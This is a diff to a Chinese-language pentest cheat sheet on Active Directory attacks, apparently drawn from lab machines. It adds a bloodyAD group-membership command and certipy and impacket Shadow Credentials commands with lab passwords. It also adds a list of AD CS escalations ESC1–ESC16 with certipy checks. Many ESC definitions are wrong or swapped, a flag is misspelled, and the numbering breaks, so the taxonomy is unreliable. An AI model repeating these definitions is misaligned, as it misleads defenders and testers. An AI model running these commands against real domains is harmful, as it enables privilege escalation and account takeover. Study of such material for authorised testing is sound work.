@@ -261,6 +261,8 @@ nxc ssh 192.168.1.50 -u root -p toor -x "id"
 ###  Shadow Credentials 
 攻擊條件:\
 `GenericAll` or `GenericWrite` or `WriteOwner`
+- 將自己加入該群組
+`bloodyAD --host '10.10.11.69' -d 'dc01.fluffy.htb' -u 'p.agila' -p 'prometheusx-303'  add groupMember 'SERVICE ACCOUNTS' p.agila`
 - 取得 Kerberos TGT 與 NTLM Hash (target: `ca_svc`)
 `certipy shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.10.11.51`
 - 更改 Object Owner (target: `ca_svc`)
@@ -269,7 +271,84 @@ nxc ssh 192.168.1.50 -u root -p toor -x "id"
 `impacket-dacledit -action write -principal ryan -target ca_svc -dc-ip 10.10.11.51 sequel.htb/ryan:WqSZAF6CysDQbGb3`
 - 再次嘗試 Shadow Credentials Attack
 `certipy shadow auto -u ryan@sequel.htb -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.10.11.51`
-- [AD CS template vul（ESC4）](https://hackmd.io/@CHW/r1X0wjUC1e#10-AD-CS-template-vul%EF%BC%88ESC4%EF%BC%89)
+### AD CS template vul
+Wiki: [ly4k/Certipy](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)
+```
+# ESC1–8
+certipy find -u user@domain.local -p Passw0rd -vulnerable
+certipy find -u user@domain.local -hases Passw0rd -vulnerable
+```
+#### 1. ESC1 - Enrollment Rights Misconfiguration
+條件：低權限使用者可以 Enroll 一個高權限模板 (ex. Domain Admins 可用)。
+
+#### 2. ESC2 - Dangerous EKU (Enrollment Agent)
+條件：某模板允許申請「Enrollment Agent」憑證，導致能簽別人的憑證\
+確認：在 template 權限裡找 `Certificate Request Agent` EKU
+
+#### 3. ESC3 - Any Purpose EKU
+條件：模板允許 Any Purpose EKU，等於可以冒充任何服務\
+確認：在模板 EKU 欄位中找到 `Any Purpose`
+
+#### 4. ESC4 - No Security Extension
+條件：模板允許你發證書，但沒有安全約束 (沒有指定 EKU)\
+確認：看模板 EKU 是否為空。
+- [ESC4](https://hackmd.io/@CHW/r1X0wjUC1e#10-AD-CS-template-vul%EF%BC%88ESC4%EF%BC%89)
+
+#### 5. ESC5 - Certificate Request Agent Abuse
+條件：你能拿到一張 Enrollment Agent 憑證，並用它幫高權限帳號申請憑證\
+確認：看誰能使用 `Certificate Request Agent` 模板，並檢查你是否能申請
+
+#### 6. ESC6 - NTAuth Store Misconfig
+條件：NTAuth Store 中包含弱 CA，導致憑證信任錯誤配置\
+確認：`certutil -dump` 看 NTAuth 內容，檢查是否包含非企業 CA
+
+#### 7. ESC7 - Vulnerable Certificate Authority Access Control
+條件：對 CA 本身有危險權限（如 ManageCA, ManageCertificates）\
+確認：
+`certipy ca -u user@domain.local -p Passw0rd -dc-ip <ip>`
+看是否有敏感 ACL 權限
+
+#### 8. ESC8 - Vulnerable Certificate Template Access Control
+條件：能修改或控制某個 template 的 ACL，進而讓它 vulnerable\
+確認：
+`certipy template -u user@domain.local -p Passw0rd -dc-ip <ip>` 檢查權限 `FullControl`、`WriteProperty`
+
+
+#### 9. ESC9 - Misconfigured Certificate Templates with Dangerous EKUs
+條件：模板允許憑證可用於 Client/Server Authentication，同時權限過寬\
+確認：看 EKU + enrollment 權限
+
+#### 10. ESC10 - Weak Certificate Mappings
+條件：憑證 mapping 使用弱屬性 (ex. UPN, SAN 不驗證)\
+確認：檢查憑證 mapping 設定 (`altSecurityIdentities`)
+
+#### 11. ESC11 - PKINIT Downgrade
+條件：Kerberos PKINIT 被允許降級 (弱憑證簽署)\
+確認：測試 AD 是否允許弱簽名 PKINIT
+
+#### 12. ESC12 - Weak Key Size
+條件：允許申請 RSA < 2048 bit 的憑證\
+確認：看模板 Key Size
+
+#### 13. ESC13 - Vulnerable Certificate Authority Trusts
+條件：信任非企業 CA (External Trust)\
+確認：檢查企業 PKI 拓樸
+
+#### 14. ESC14 - Subordinate CA Abuse
+條件：控制一個子 CA，就能發任何證書\
+確認：找 ACL / ManageCA 權限
+
+#### 15. ESC15 - NTLM Relay to AD CS HTTP Endpoints
+條件：AD CS Web Enrollment 存在，且可被 NTLM Relay\
+確認：
+`certipy relay -ca <ca-name> -target http://<CA>/certsrv/`
+若能成功，表示 vulnerable
+
+#### 5. ESC16 - HTTP Enrollment Service Misconfig
+條件：AD CS Web Enrollment 未設防護，允許弱驗證方式\
+確認：存取 `/certsrv/` 看是否能匿名或弱身份驗證存取
+- [ESC16](https://www.hyhforever.top/posts/2025/05/htb-fluffy/#esc16)
+
 
 ###  RecycleBin
 >[!Important]
